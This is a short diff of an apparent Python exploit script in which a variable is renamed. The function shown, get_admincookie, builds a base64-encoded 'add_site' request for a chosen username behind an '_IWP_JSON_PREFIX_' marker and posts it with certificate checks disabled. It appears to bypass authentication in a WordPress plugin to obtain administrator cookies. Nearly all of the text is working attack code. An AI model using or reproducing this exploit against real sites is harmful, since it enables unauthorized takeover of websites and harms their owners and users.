@@ -13,8 +13,8 @@ headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gec
         'Cookie': 'humans_21909=1'}
 
 def get_admincookie(url, username):
-    test = '''{"iwp_action":"add_site", "params":{"username": "%s"}}'''.encode('utf-8') % (username).encode('utf-8')
-    encoded_bytes = base64.b64encode(test).decode('utf-8')
+    payload = '''{"iwp_action":"add_site", "params":{"username": "%s"}}'''.encode('utf-8') % (username).encode('utf-8')
+    encoded_bytes = base64.b64encode(payload).decode('utf-8')
     final_data = f'_IWP_JSON_PREFIX_{encoded_bytes}'
 
     r = requests.post(url, headers=headers, data=final_data, timeout=10, verify=False)
